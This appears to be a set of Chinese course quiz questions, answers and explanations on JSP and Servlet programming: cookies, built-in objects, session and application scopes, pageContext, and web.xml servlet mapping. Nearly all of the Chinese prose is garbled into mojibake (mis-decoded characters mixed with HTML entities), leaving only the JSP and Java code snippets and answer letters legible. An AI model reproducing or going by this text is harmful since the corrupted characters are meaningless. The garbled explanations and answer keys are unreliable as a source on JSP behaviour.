Cookieå¯ä»¥æŒä¹…åœ°ä¿æŒä¸€äº›å’Œå®¢æˆ·ç›¸å…³çš„ä¿¡æ¯ åœ¨è§£å†³Cookieçš„å®‰å…¨é—®é¢˜æ—¶å¯ä»¥é‡‡ç”¨åŠæ—¶åˆ é™¤Cookieçš„æ–¹æ³•ã€‚ä¸‹åˆ—åšæ³•ä¸èƒ½åˆ é™¤ä¸€ä¸ªå·²ç»å­˜åœ¨çš„Cookieçš„æ˜¯ï¼ˆï¼‰ã€‚ A. ä½¿ç”¨è·¨ç«™è„šæœ¬æŠ€æœ¯ XSS âœ… B. é€šè¿‡æµè§ˆå™¨åˆ é™¤Cookie C. ç»™Cookieèµ‹ç©ºå€¼ D. ç¦ç”¨Cookie åœ¨JSPé¡µé¢ä¸­ä¸éœ€è¦å®šä¹‰å°±å¯ä»¥ç›´æ¥ä½¿ç”¨çš„å¯¹è±¡å«å†…ç½®å¯¹è±¡ åœ¨JSPçš„å†…ç½®å¯¹è±¡ä¸­ï¼Œoutå¯¹è±¡è´Ÿè´£ç®¡ç†å¯¹å®¢æˆ·ç«¯çš„è¾“å‡ºï¼Œä¸»è¦æœ‰ä¸¤ç§è¾“å‡ºæ–¹æ³•ï¼Œåˆ†åˆ«æ˜¯print()å’Œprintln()ã€‚ outå¯¹è±¡çš„close()æ–¹æ³•å¯ä»¥å¼ºåˆ¶ç»ˆæ­¢å½“å‰é¡µé¢çš„å‰©ä½™éƒ¨åˆ†å‘æµè§ˆå™¨è¾“å‡ºã€‚ requestå¯¹è±¡å¯¹åº”çš„ç±»å‹æ˜¯javax.servlet.http.HttpServletRequest è´Ÿè´£å¾—åˆ°å®¢æˆ·ç«¯è¯·æ±‚çš„å†…ç½®å¯¹è±¡æ˜¯requestï¼Œè´Ÿè´£èº«å®¢æˆ·ç«¯å‘å‡ºå“åº”çš„å†…ç½®å¯¹è±¡æ˜¯responseã€‚ ç”¨responseè¿›è¡Œé‡å®šå‘çš„æ–¹æ³•æ˜¯response.sendRedirect(ç›®æ ‡é¡µé¢è·¯å¾„)ã€‚ responseçš„sentError()æ–¹æ³•ç”¨äºå‘å®¢æˆ·ç«¯å‘é€HTTPçŠ¶æ€ç çš„å‡ºé”™ä¿¡æ¯ã€‚ Cookieæ˜¯ä¸€ä¸ªå°çš„æ–‡æœ¬æ•°æ®ï¼Œç”±æœåŠ¡å™¨ç«¯äº§ç”Ÿï¼Œå‘é€ç»™æœ¬åœ°ç”¨æˆ· åœ¨ä¸€èˆ¬æƒ…å†µä¸‹ï¼ŒCookieä¸­çš„å€¼æ˜¯ä»¥key-valueçš„å½¢å¼è¿›è¡Œè¡¨è¾¾çš„ã€‚ response.addCookie(Cookie c)ï¼Œé€šè¿‡è¯¥æ–¹æ³•å°† Cookie å†™å…¥å®¢æˆ·ç«¯ã€‚ Cookie.setMaxAge(int second) , é€šè¿‡è¯¥æ–¹æ³•è®¾ç½® Cookie çš„å­˜æ´»æ—¶é—´ã€‚Cookie[] request.getCookies() , è¯»å–å®¢æˆ·ç«¯ä¼ è¿‡æ¥çš„ Cookie ï¼Œä»¥æ•°ç»„å½¢å¼è¿”å›ã€‚ ç°æœ‰éƒ¨åˆ†æœ‰å…³JSPç¼“å­˜ä¸Servletç¼“å­˜ä»£ç æ®µï¼Œè¯·é—®é¡µé¢è¾“å‡ºç»“æœä¸ºï¼ˆ èƒœ æˆ˜ç—…ï¼æ¯’ï¼‰ã€‚ 12345678&lt;% out.print(&quot;æˆ˜&quot;); response.getWriter().print(&quot;èƒœ&quot;);out.print(&quot;ç—…&quot;); out.flush();out.print(&quot;æ¯’&quot;);response.getWriter().print(&quot;ï¼&quot;); %&gt; outå¯¹è±¡å…ˆè¾“å‡ºåˆ°JSPç¼“å­˜å†åˆ°Servletç¼“å­˜æœ€ååˆ°é¡µé¢ã€‚ response.getWriter()ç›´æ¥è¾“å‡ºåˆ°Servletç¼“å­˜å†åˆ°é¡µé¢ã€‚ ï¼ˆ1ï¼‰out.print(â€œæˆ˜â€);&#x2F;&#x2F;å°†â€œæˆ˜â€è¾“å‡ºåˆ°JSPç¼“å­˜ ï¼ˆ2ï¼‰response.getWriter().print(â€œèƒœâ€œ); &#x2F;&#x2F;å°†â€œèƒœâ€è¾“å‡ºåˆ°Servletç¼“å­˜ï¼Œæœ€å…ˆè¾“å‡ºåˆ°é¡µé¢çš„æ˜¯â€œèƒœâ€ã€‚ ï¼ˆ3ï¼‰out.print(â€œç—…â€); &#x2F;&#x2F;å°†â€œç—…â€è¾“å‡ºåˆ°JSPç¼“å­˜ï¼Œæ’åœ¨â€œæˆ˜â€åé¢ï¼ŒJSPç¼“å­˜é˜Ÿåˆ—ä¸ºâ€œæˆ˜ã€ç—…â€ã€‚ ï¼ˆ4ï¼‰out.flush(); &#x2F;&#x2F;æ‰‹åŠ¨åˆ·æ–°JSPç¼“å­˜å¹¶å°†â€œæˆ˜ã€ç—…â€è¾“å‡ºåˆ°Servletç¼“å­˜ï¼Œæ’åœ¨â€œèƒœâ€çš„åé¢ï¼Œç°åœ¨Servletç¼“å­˜é˜Ÿåˆ—ä¸ºâ€œèƒœã€æˆ˜ã€ç—…â€œã€‚ ï¼ˆ5ï¼‰out.print(â€œæ¯’â€); &#x2F;&#x2F;å°†â€œæ¯’â€œè¾“å‡ºåˆ°JSPç¼“å­˜ï¼Œç°åœ¨JSPç¼“å­˜é˜Ÿåˆ—ä¸ºâ€æ¯’â€œã€‚ ï¼ˆ6ï¼‰response.getWriter().print(â€œï¼â€); &#x2F;&#x2F;å°†â€œï¼â€œè¾“å‡ºåˆ°Servletç¼“å­˜ï¼Œç°åœ¨Servletç¼“å­˜é˜Ÿåˆ—ä¸ºâ€œèƒœã€æˆ˜ã€ç—…ã€ï¼â€œã€‚ | ï¼ˆ7ï¼‰ç¨‹åºç»“æŸJSPç¼“å­˜è¾“å‡ºåˆ°Servletç¼“å­˜ï¼Œç°åœ¨Servletç¼“å­˜é˜Ÿåˆ—ä¸ºâ€œèƒœã€æˆ˜ã€ç—…ã€ï¼ã€æ¯’â€œï¼Œæœ€åè¾“å‡ºåˆ°å®¢æˆ·ç«¯é¡µé¢ã€‚ ç°æœ‰éƒ¨åˆ†ä»£ç å¦‚ä¸‹ï¼Œå‡ºç°é”™è¯¯æç¤ºä¸ºâ€œjava.lang.NumberFormatException: nullâ€ï¼Œè¯·å¸®åŒå­¦è§£å†³é—®é¢˜ï¼ˆï¼‰ 123456789101112131 &lt;%2 for (int i = 1; i &lt; 10; i++) &#123;3 %&gt;4 &lt;a href=&quot;05_1.jsp?num=&lt;%=i%&gt;&quot;&gt;&lt;%=i%&gt;&lt;/a&gt;&lt;br&gt;5 &lt;%6 &#125;7 %&gt;8 &lt;%9 String numstr = null;10 numstr = request.getParameter(&quot;num&quot;);11 int num1 = Integer.parseInt(numstr);12 %&gt;13 è¯¥æ•°å­—çš„å¹³æ–¹ä¸º&lt;%=num1*num1%&gt; åœ¨ç¬¬11è¡Œå’Œç¬¬13è¡Œååˆ†åˆ«åŠ å…¥if(numstr ! = null)&#123; å’Œ &lt;%&#125;%&gt; è·å–æ•°æ®æ—¶å‡ºç°ç©ºå€¼ï¼Œæ‰€ä»¥åšä¸€ä¸ªéç©ºåˆ¤æ–­ æœ‰å¦‚ä¸‹ç¨‹åºç‰‡æ®µï¼š 1234&lt;form&gt; &lt;input type=â€textâ€ name=â€numberâ€&gt; &lt;input type=â€submitâ€ value=â€æäº¤â€&gt;&lt;/form&gt; ä¸‹é¢ï¼ˆï¼‰è¯­å¥å¯ä»¥è·å–ç”¨æˆ·è¾“å…¥çš„ä¿¡æ¯ã€‚ request.getParameter(&quot;number&quot;); response å†…ç½®å¯¹è±¡æ˜¯å¯¹å®¢æˆ·çš„è¯·æ±‚åšå‡ºå“åº”ï¼Œå‘å®¢æˆ·ç«¯å‘é€æ•°æ®çš„ã€‚ request å¾—åˆ°å®¢æˆ·ç«¯çš„è¯·æ±‚ä¿¡æ¯session ä¿å­˜åŒä¸€å®¢æˆ·ç«¯ä¸€æ¬¡ä¼šè¯è¿‡ç¨‹ä¸­çš„ä¸€äº›ä¿¡æ¯application è¡¨ç¤ºæ•´ä¸ªåº”ç”¨çš„ç¯å¢ƒä¿¡æ¯response å‘å®¢æˆ·ç«¯å‘å‡ºå“åº” ç°æœ‰a.jspã€b.jspã€c.jspä¸‰ä¸ªé¡µé¢ï¼Œå¦‚æœè¿è¡Œa.jspé¡µé¢åœ¨â€œè¾“å…¥å­¦ç”Ÿå§“åï¼šâ€è¾“å…¥æ¡†å†…è¾“å…¥Roseï¼Œç‚¹å‡»æŸ¥è¯¢æŒ‰é’®ä»¥åé¡µé¢ä¼šæ˜¾ç¤ºä»€ä¹ˆå†…å®¹ï¼ˆï¼‰ã€‚ è¾“å…¥å­¦ç”Ÿå§“åæ˜¯ï¼šnull 1234567891011a.jsp&lt;%@ page language=&quot;java&quot; import=&quot;java.util.*&quot; contentType=&quot;text/html; charset=gb2312&quot; %&gt; &lt;html&gt; &lt;body&gt; &lt;form action=&quot;b.jsp&quot;&gt; è¾“å…¥å­¦ç”Ÿå§“åï¼š&lt;input type=&quot;text&quot; name=&quot;stuname&quot;&gt; &lt;input type=&quot;submit&quot; value=&quot;æŸ¥è¯¢&quot;&gt; &lt;/form&gt; &lt;/body&gt; &lt;/html&gt; 123456789b.jsp&lt;%@ page language=&quot;java&quot; import=&quot;java.util.*&quot; contentType=&quot;text/html; charset=gb2312&quot; %&gt; &lt;html&gt; &lt;body&gt; &lt;% response.sendRedirect(&quot;c.jsp&quot;); %&gt; &lt;/body&gt; &lt;/html&gt; 12345678910c.jsp&lt;%@ page language=&quot;java&quot; import=&quot;java.util.*&quot; contentType=&quot;text/html; charset=gb2312&quot; %&gt; &lt;html&gt; &lt;body&gt; &lt;% out.println(&quot;è¾“å…¥å­¦ç”Ÿå§“åæ˜¯ï¼š&quot;+request.getParameter(&quot;stuname&quot;)+&quot;&lt;br&gt;&quot;); %&gt; &lt;/body&gt; &lt;/html&gt; å¦‚æœæƒ³è®©elseç¨‹åºæ®µå†…å®¹æˆåŠŸè·³è½¬åˆ°b.jspé¡µé¢ï¼Œè¯·è¡¥å…¨ä»£ç ï¼ˆï¼‰ã€‚ 1234567891011121314151617181920&lt;%String name=request.getParameter(&quot;userName&quot;);String password=request.getParameter(&quot;pwd&quot;);if(&quot;zhangsan&quot;.equals(name)&amp;&amp;&quot;123&quot;.equals(password))&#123;out.print(&quot;æˆåŠŸç™»é™†ï¼Œ3ç§’é’Ÿåè¿›å…¥loginSuccess.jspé¡µé¢&quot;);response.setHeader(&quot;refresh&quot;, &quot;3;url=a.jsp&quot;);return;&#125;else&#123;&#125;-----------------%&gt; %&gt;&lt;jsp:forward page=&quot;b.jsp&quot;/&gt;&lt;% ç°æœ‰cookieç›¸å…³éƒ¨åˆ†ä»£ç å¦‚ä¸‹ï¼Œè¯·é—®å½“å‰cookieçš„æœ‰æ•ˆæ—¶é—´ä¸ºï¼ˆï¼‰ã€‚ å…³é—­æµè§ˆå™¨æ—¶å¤±æ•ˆ 12345678&lt;% String str=&quot;12&quot; ; int number=Integer.parseInt(str); %&gt; è¯¥æ•°å­—çš„å¹³æ–¹ä¸ºï¼š&lt;%=number*number %&gt; &lt;HR&gt; &lt;% Cookie cookie=new Cookie(&quot;number&quot;,str); cookie.setMaxAge(-10); response.addCookie(cookie); %&gt; &lt;a href=&quot;b.jsp&quot;&gt;åˆ°è¾¾p2&lt;/a&gt; cookie.setMaxAge(int time) è®¾ç½®å­˜æ´»æ—¶é—´ timeæ­£æ•´æ•°ï¼Œè¡¨ç¤ºå­˜æ´»çš„ç§’æ•° timeè´Ÿæ•°ï¼Œä»£è¡¨ä¸´æ—¶cookieï¼Œæµè§ˆå™¨å…³é—­æ—¶å¤±æ•ˆ time 0 ï¼Œè¡¨ç¤ºé€šçŸ¥æµè§ˆå™¨åˆ é™¤ç›¸åº”çš„cookieå¯¹è±¡ ç¬¬å…«ç«  JSPå†…ç½®å¯¹è±¡(2) ä¸‹åˆ—å…³äºsessionçš„è¯´æ³•é”™è¯¯çš„æ˜¯ï¼ˆï¼‰ã€‚ A. sessionèƒ½å¤Ÿè·¨é¡µä¿æŒã€‚ B. sessionè´Ÿè´£ä¿å­˜åŒä¸€ä¸ªå®¢æˆ·ç«¯ä¸€æ¬¡ä¼šè¯è¿‡ç¨‹ä¸­çš„ä¸€äº›ä¿¡æ¯ã€‚ C. åœ¨è®¿é—®ç½‘ç«™æ—¶ï¼ŒæœåŠ¡å™¨ç«¯è‡ªåŠ¨åˆ†é…ä¸€ä¸ªsessionå¯¹è±¡ç»™ç”¨æˆ·ä½¿ç”¨ã€‚ D. å¯¹äºåŒä¸€ä¸ªç”¨æˆ·ï¼Œå½“ç½‘ç«™çš„é¡µé¢æ”¹å˜æ—¶ï¼Œç”¨æˆ·ä½¿ç”¨çš„sessionä¹Ÿä¼šæ”¹å˜ã€‚ âŒ é€šè¿‡session.setAttribute(String name,Object obj)æ–¹æ³•å¯ä»¥å°†å†…å®¹ä¿å­˜åœ¨sessionä¸­ã€‚ session.setAttribute(String name,Object obj)ä¸­çš„ç¬¬2ä¸ªå‚æ•°å¯ä»¥æ˜¯è‡ªå®šä¹‰ç±»å‹ã€‚ ä¸‹åˆ—å…³äºsessionIdçš„è¯´æ³•é”™è¯¯çš„æ˜¯ï¼ˆï¼‰ã€‚ A. çš„ç¬¬ä¸€æ¬¡è®¿é—®æ—¶ï¼ŒæœåŠ¡å™¨ç«¯éƒ½æœ‰ä¸€ä¸ªsessionåˆ†é…äº†ä¸€ä¸ªsessionIdã€‚ B. å¯¹äºæ¯ä¸€ä¸ªsessionï¼ŒæœåŠ¡å™¨ç«¯éƒ½æœ‰ä¸€ä¸ªsessionIdæ¥æ ‡è¯†å®ƒã€‚ C. åœ¨å®¢æˆ·ç«¯è®¿é—®ä¸‹ä¸€ä¸ªé¡µé¢æ—¶ï¼Œä¸ä¼šå°†sessionIdä¼ é€’ç»™æœåŠ¡ç«¯ã€‚ âŒ D. å¯¹äºä¸åŒçš„å®¢æˆ·æ¥è¯´ï¼Œæ¯ä¸ªäººçš„sessionæ˜¯ä¸åŒçš„ã€‚ æ˜¾ç¤ºæŸä¸ªé¡µé¢è¢«è®¿é—®çš„æ¬¡æ•°å¯ä»¥ç”¨applicationå¯¹è±¡ excepitonå¯¹è±¡å¯¹åº”çš„ç±»æ˜¯ java.lang.Excepiton ã€‚ pageContext å¯¹è±¡æä¾›äº†å¯¹JSPé¡µé¢ä¸­æ‰€æœ‰å¯¹è±¡åŠå‘½åç©ºé—´çš„è®¿é—®ã€‚ åœ¨æœåŠ¡å™¨å¯åŠ¨åå°±ä¼šè‡ªåŠ¨åˆ›å»ºapplicationå¯¹è±¡ï¼Œè¿™ä¸ªå¯¹è±¡ä¼šä¸€ç›´ä¿å­˜ï¼Œç›´åˆ°æœåŠ¡å™¨å…³é—­ä¸ºæ­¢ã€‚ sessionå¯¹åº”çš„ç±»æ˜¯ javax.servlet.http.HttpSession å°†sessionä¸­çš„å†…å®¹å…¨éƒ¨ç§»é™¤çš„æ–¹æ³•æ˜¯void session.invalidate() å¯¹äºæ¯ä¸€ä¸ªsessionï¼ŒæœåŠ¡å™¨ç«¯éƒ½æœ‰ä¸€ä¸ªsessionIdæ¥æ ‡è¯†å®ƒ è·å¾—å½“å‰sessionåœ¨æœåŠ¡å™¨ç«¯çš„IDçš„æ–¹æ³•æ˜¯String session.getId(); å¯¹äºä¸€ä¸ªWebå®¹å™¨è€Œè¨€ï¼Œæ‰€æœ‰çš„ç”¨æˆ·å…±åŒä½¿ç”¨ä¸€ä¸ªsessionå¯¹è±¡ã€‚âŒ applicationå¯¹åº”çš„ç±»æ˜¯javax.servlet.ServletContext configå¯¹è±¡æ˜¯åœ¨ä¸€ä¸ªJSPç¨‹åºåˆå§‹åŒ–æ—¶JSPå¼•æ“å‘å®ƒä¼ é€’æ¶ˆæ¯ç”¨çš„ã€‚ pageå¯¹è±¡æŒ‡å‘å½“å‰JSPç¨‹åºæœ¬èº« åœ¨JSPä¸­ä¿å­˜ç”¨æˆ·ä¼šè¯ä¿¡æ¯ä½¿ç”¨ï¼ˆ session ï¼‰å¯¹è±¡ã€‚ å¦‚æœé€‰æ‹©ä¸€ä¸ªå¯¹è±¡ä¿å­˜èŠå¤©å®¤ä¿¡æ¯ï¼Œåˆ™é€‰æ‹©ï¼ˆ application ï¼‰ã€‚ å“ªä¸ªæ–¹æ³•æ˜¯ä¿å­˜sessionä¸­å…³é”®å­—æ˜¯keyçš„å¯¹è±¡ 1public void setAttibute(String key,Object obj) ç°æœ‰ä»¥ä¸‹éƒ¨åˆ†ä»£ç æ®µï¼Œä¸»è¦åŠŸèƒ½å¯ä»¥å®ç°å°†ç‰©å“æ·»åŠ åˆ°è´­ç‰©è½¦ï¼Œè¯·è¡¥å…¨ä»£ç ã€‚ 123456789101112&lt;form action=&quot;order.jsp&quot; method=&quot;post&quot;&gt; ä¸‰å›½æ¼”ä¹‰&lt;input name=&quot;goods&quot; type=&quot;hidden&quot; value=&quot;ä¸‰å›½æ¼”ä¹‰&quot;&gt; &lt;input type=&quot;submit&quot; value=&quot;æ·»åŠ åˆ°è´­ç‰©è½¦&quot;&gt;&lt;/form&gt;&lt;% ArrayList good=(ArrayList) session. â‘  if(good==null)&#123; good=new ArrayList(); session. â‘¡ &#125;else&#123; String goods=request. â‘¢ if(godd!=null)&#123; goods=new String(goods.getBytes(&quot;ISO-8859-1&quot;),&quot;gb2312&quot;); good.add( â‘£ ); &#125; &#125; %&gt; â‘  getAttribute(â€œgoodâ€); &#x2F;&#x2F;è¯»å–è´­ç‰©è½¦ â‘¡ setAttribute(â€œgoodâ€,good) &#x2F;&#x2F;å­˜å…¥è´­ç‰©è½¦ï¼Œsessionå¯¹è±¡ â‘¢ getParameter(â€œgoodâ€) &#x2F;&#x2F;è·å–è¡¨å•é‡Œæ–‡æœ¬æ¡†å±æ€§å â‘£ goods &#x2F;&#x2F;å°†goodsçš„å€¼å­˜å…¥goodå¯¹è±¡ é€šè¿‡ç›¸å…³æ–¹æ³•è¾“å‡ºsessionå¯¹è±¡çš„ç”Ÿå­˜æœŸé™ç¬¬ä¸€æ¬¡è®¿é—®å½“å‰webæœåŠ¡çš„å‚æ•°å¦‚å›¾æ‰€ç¤ºï¼Œå¦‚æœç°åœ¨ç»è¿‡20ç§’ç¬¬äºŒæ¬¡è®¿é—®æ­¤é¡µé¢ï¼Œä¸‹é¢å“ªäº›å‚æ•°ä¼šå‘ç”Ÿå˜åŒ–ï¼ˆï¼‰ã€‚ è¶…è¿‡å‘å‘†æ—¶é—´ï¼Œç¬¬äºŒæ¬¡è®¿é—®é¡µé¢ï¼Œsessionçš„åˆ›å»ºæ—¶é—´ã€IDã€ä¸Šä¸€æ¬¡è¯·æ±‚æ—¶é—´éƒ½ä¼šå‘ç”Ÿå˜åŒ– ä½¿ç”¨pageContextå†…ç½®å¯¹è±¡å¯ä»¥æ“ä½œå½“å‰JSPé¡µé¢çš„æ‰€æœ‰å…¶ä»–å†…ç½®å¯¹è±¡ï¼Œç°æœ‰å¦‚ä¸‹ä»£ç æ®µï¼Œè¯·é—®é¡µé¢æœ€åè¾“å‡ºçš„ç»“æœï¼ˆï¼‰ã€‚ 123456789101112131415161718&lt;% application.setAttribute(&quot;applicationKey&quot;, &quot;applicationKey&quot; ); String applicationValue=(String)pageContext.getAttribute(&quot;applicationKey&quot;,4); session.setAttribute(&quot;sessionKey&quot;, &quot;sessionKey&quot; ); String sessionValue=(String)pageContext.getAttribute(&quot;sessionKey&quot;,3); request.setAttribute(&quot;requestKey&quot;, &quot;requestKey&quot; ); String requestValue=(String)pageContext.getAttribute(&quot;requestKey&quot;,2); pageContext.setAttribute(&quot;pageKey&quot;, &quot;pageKey&quot; ); String pageValue=(String)pageContext.getAttribute(&quot;pageKey&quot;,1); pageContext.removeAttribute(&quot;requestKey&quot;,2); pageContext.removeAttribute(&quot;applicationKey&quot;,4); pageContext.setAttribute(&quot;applicationKey&quot;,&quot;Java Web&quot;,4); %&gt; é¡µé¢åŸŸçš„èŒƒå›´scopeï¼š&lt;%=pageContext.getAttributesScope(&quot;pageKey&quot;)%&gt;&lt;br&gt; è¯·æ±‚åŸŸçš„èŒƒå›´scopeï¼š&lt;%=pageContext.getAttributesScope(&quot;requestKey&quot;)%&gt;&lt;br&gt; ä¼šè¯åŸŸçš„èŒƒå›´scopeï¼š&lt;%=pageContext.getAttributesScope(&quot;sessionKey&quot;)%&gt;&lt;br&gt; åº”ç”¨åŸŸçš„èŒƒå›´scopeï¼š&lt;%=pageContext.getAttributesScope(&quot;applicationKey&quot;)%&gt;&lt;br&gt; é€‰é¡¹Dï¼š pageContext.removeAttribute(â€œrequestKeyâ€œ;,2); &#x2F;&#x2F;ä»scopeèŒƒå›´2ç§»é™¤å…³é”®å­— requestKeyçš„å±æ€§å¯¹è±¡ï¼Œæœ€ç»ˆæ‰“å°scopeå€¼ä¸º0ã€‚ pageContext.removeAttribute(â€œapplicationKeyâ€œ;,4); &#x2F;&#x2F;ä»scopeèŒƒå›´4ç§»é™¤å…³é”®å­—ä¸ºapplicationKeyçš„å±æ€§å¯¹è±¡ã€‚ pageContext.setAttribute(â€œapplicationKeyâ€,â€Java Webâ€,4); &#x2F;&#x2F;ä»¥K&#x2F;Vå¯¹çš„æ–¹å¼å­˜å‚¨scopeèŒƒå›´åŸŸ4å±æ€§å¯¹è±¡å€¼â€Java Webâ€ï¼Œæœ€ç»ˆæ‰“å°scopeå€¼ä¸º4. é¡µé¢åŸŸçš„èŒƒå›´scopeï¼š1 è¯·æ±‚åŸŸçš„èŒƒå›´scopeï¼š0 ä¼šè¯åŸŸçš„èŒƒå›´scopeï¼š3 åº”ç”¨åŸŸçš„èŒƒå›´scopeï¼š4 ç°åœ¨åˆ†åˆ«ç”¨é¡µé¢åŸŸã€ä¼šè¯åŸŸå’Œåº”ç”¨åŸŸåˆ¶ä½œè®¿é—®ç»Ÿè®¡ï¼Œç°åœ¨ç”¨IEæµè§ˆå™¨è®¿é—®é¡µé¢ç»“æœå¦‚å›¾æ‰€ç¤ºã€‚è¯·é—®ç°åœ¨ç”¨Chromeæµè§ˆå™¨è®¿é—®æ­¤é¡µé¢åæ˜¾ç¤ºç»“æœä¸ºï¼ˆï¼‰ é¡µé¢åŸŸè®¿é—®ç»Ÿè®¡ï¼š1 ä¼šè¯åŸŸè®¿é—®ç»Ÿè®¡ï¼š1 åº”ç”¨åŸŸè®¿é—®ç»Ÿè®¡ï¼š13 é¡µé¢åŸŸï¼ˆpage scopeï¼‰ï¼Œå®ƒçš„ç”Ÿå‘½å‘¨æœŸæ˜¯æŒ‡é¡µé¢æ‰§è¡ŒæœŸé—´ã€‚å­˜å‚¨åœ¨é¡µé¢åŸŸçš„å¯¹è±¡åªèƒ½åœ¨å®ƒæ‰€åœ¨é¡µé¢è¢«è®¿é—®ï¼Œä½œç”¨èŒƒå›´å½“å‰é¡µé¢ã€‚ç›¸åŒæˆ–ä¸åŒæµè§ˆå™¨ï¼ˆç”¨æˆ·ï¼‰çš„è®¡æ•°å˜é‡ä¸èƒ½å…±äº«ï¼Œæ²¡æœ‰è®¡æ•°åŠŸèƒ½ã€‚ ä¼šè¯åŸŸï¼ˆsession scopeï¼‰ï¼Œå®ƒçš„ç”Ÿå‘½å‘¨æœŸæ˜¯æŒ‡æŸä¸ªå®¢æˆ·ç«¯ä¸æœåŠ¡å™¨æ‰€è¿æ¥çš„æ—¶é—´ã€‚å®¢æˆ·ç«¯åœ¨ç¬¬1æ¬¡è®¿é—®æœåŠ¡å™¨æ—¶åˆ›å»ºä¼šè¯ï¼Œåœ¨ä¼šè¯è¿‡æœŸæˆ–ç”¨æˆ·ä¸»åŠ¨é€€å‡ºåï¼Œä¼šè¯ç»“æŸã€‚å­˜å‚¨åœ¨ä¼šè¯åŸŸä¸­çš„å¯¹è±¡åœ¨æ•´ä¸ªä¼šè¯æœŸé—´ï¼ˆå¯ä»¥åŒ…å«å¤šæ¬¡è¯·æ±‚ï¼‰éƒ½å¯ä»¥è¢«è®¿é—®ã€‚ä¸åŒæµè§ˆå™¨ï¼ˆç”¨æˆ·ï¼‰çš„è®¡æ•°å˜é‡ä¸èƒ½å…±äº«ï¼Œåªèƒ½è®¡æ•°åŒä¸€æµè§ˆå™¨ï¼ˆç”¨æˆ·ï¼‰çš„è®¿é—®ç»Ÿè®¡ã€‚ åº”ç”¨åŸŸï¼ˆapplication scopeï¼‰ï¼Œå®ƒçš„ç”Ÿå‘½å‘¨æœŸæ˜¯æŒ‡ä»æœåŠ¡å™¨å¼€å§‹æ‰§è¡ŒæœåŠ¡åˆ°æœåŠ¡å™¨å…³é—­ä¸ºæ­¢ã€‚å­˜å‚¨åœ¨åº”ç”¨åŸŸä¸­çš„å¯¹è±¡åœ¨æ•´ä¸ªåº”ç”¨ç¨‹åºè¿è¡ŒæœŸé—´å¯ä»¥è¢«æ‰€æœ‰JSPå’ŒServletå…±äº«è®¿é—®ã€‚å¯ä»¥è®¡æ•°æ‰€æœ‰è®¿é—®æœ¬é¡µé¢çš„æµè§ˆå™¨ï¼ˆç”¨æˆ·ï¼‰æ•°ã€‚ ç¬¬ä¹ç«  Servletç¼–ç¨‹1-5ï¼šDACBB 6-10ï¼šCCADA åœ¨Java Webä¸­ï¼ŒServletç¨‹åºéœ€è¦åœ¨ web.xml æ–‡ä»¶ä¸­é…ç½®ã€‚ åœ¨éƒ¨ç½²å¸¦æœ‰Servletçš„Java Webç¨‹åºæ—¶ï¼Œï¼ˆï¼‰ä¸æ˜¯å¿…éœ€çš„ã€‚ A. cssesæ–‡ä»¶å¤¹ âœ… B. WEB-INFæ–‡ä»¶å¤¹ C. web.xmlæ–‡ä»¶ D. classesæ–‡ä»¶å¤¹ å®Œæ•´é…ç½®Servletéœ€è¦çš„æ ‡ç­¾ &lt;servlet&gt;&lt;/servlet&gt;å’Œ&lt;servlet-mapping&gt;&lt;/servlet-mapping&gt; å¦‚æœæ˜¯æ•´ä¸ªåº”ç”¨ç¨‹åºå…±äº«çš„æ•°æ®ï¼Œåˆ™é€‚åˆæ”¾åœ¨ServletContext ä¸­æˆä¸ºå±æ€§ã€‚ HttpServletå®šä¹‰åœ¨javax.servlet.httpä¹‹ä¸­ã€‚ åœ¨web.xmlä¸­é¢„å…ˆå¯¹Servletè¿›è¡Œåˆå§‹åŒ–è®¾ç½®çš„ä»£ç å¦‚ä¸‹ï¼š 1234&lt;int-param&gt;&lt;param-name&gt;myWord&lt;/param-name&gt;&lt;param-value&gt;hello&lt;/param-value&gt;&lt;/init-param&gt; è·å–åˆå§‹åŒ–å‚æ•°String myWord=getInitParameter(â€œmyWordâ€); åœ¨Servletä¸­ï¼ŒHttpServletResponser ()æ–¹æ³•ç”¨æ¥æŠŠä¸€ä¸ªHTTPè¯·æ±‚é‡å®šå‘åˆ°å¦å¤–çš„URLã€‚ A. redirectResponse() B. sendURL() C. sendRedirect() D. redirectURL() ç»™å®šä¸€ä¸ªServletçš„ä»£ç ç‰‡æ®µå¦‚ä¸‹ï¼š 1234Public void doGet(HttpServletRequest request,HttpServletResponse response) throw ServletException,IOException&#123; out.println(â€œhi kitty!â€); out.close();&#125; è¿è¡Œè¯¥Servletæ—¶è¾“å‡ºâ€œhi kitty!â€œï¼Œåˆ™åº”åœ¨æ­¤Servletçš„ä¸¤çœ¼ä¸€ä¸‹ç”»çº¿å¤„å¡«å…¥çš„ä»£ç æ˜¯ï¼ˆï¼‰ A. PrintWriter out&#x3D;response.getWriter(); B. OutputStream out&#x3D;request.getOutputStream(); C. PrintWriter out&#x3D;request.getWriter(); D. OutputStream out&#x3D;response.getOutputStream(); ç»™å®šä¸€ä¸ªServletç¨‹åºçš„ä»£ç ç‰‡æ®µå¦‚ä¸‹ï¼š 123Public void doPost(HttpServletRequest request,HttpServletResponse response) throw ServletException,IOException&#123; Request.getSession().getAttribute(â€œAâ€); //ç¬¬2è¡Œ&#125; å‡å®šç¬¬2è¡Œè¿”å›çš„å¯¹è±¡å¼•ç”¨ä¸æ˜¯nullï¼Œé‚£ä¹ˆè¿™ä¸ªå¯¹è±¡å­˜å‚¨åœ¨ï¼ˆï¼‰èŒƒå›´ä¸­ã€‚ A. page B. application C. request D. session åœ¨web.xmlä¸­å®šä¹‰äº†ä»¥ä¸‹å†…å®¹ï¼š 12345678&lt;servlet&gt;&lt;servlet-name&gt;Goodbye&lt;/servlet-name&gt;&lt;servlet-class&gt;cc.openhome.LogutServlet&lt;/servlet-class&gt;&lt;/servlet&gt;&lt;servlet-mapping&gt;&lt;servlet-name&gt;GoodBye&lt;/servlet-mapping&gt;&lt;url-pattern&gt;/goodbye&lt;/url-pattern&gt;&lt;/servlet-mapping&gt; ä¸‹åˆ—å¯ä»¥æ­£ç¡®è®¿é—®è¯¥Servlet URLçš„æ˜¯ï¼ˆï¼‰ã€‚ A. &#x2F;goodBye B. &#x2F;goodbye.servlet C. &#x2F;LoguotServlet D. &#x2F;Goodbye 1-5ï¼šAAAAB 6-10ï¼šBBBA Servletæ˜¯ä¸€ç§è¿è¡Œåœ¨æœåŠ¡å™¨ç«¯å’Œå®¢æˆ·ç«¯çš„Javaåº”ç”¨ç¨‹åºï¼Œå¯ä»¥ç”ŸæˆåŠ¨æ€çš„Webé¡µé¢ï¼Œå®ƒå±äºå®¢æˆ·å’ŒæœåŠ¡å™¨å“åº”çš„ä¸­é—´å±‚ã€‚ A. Ã— B. âˆš 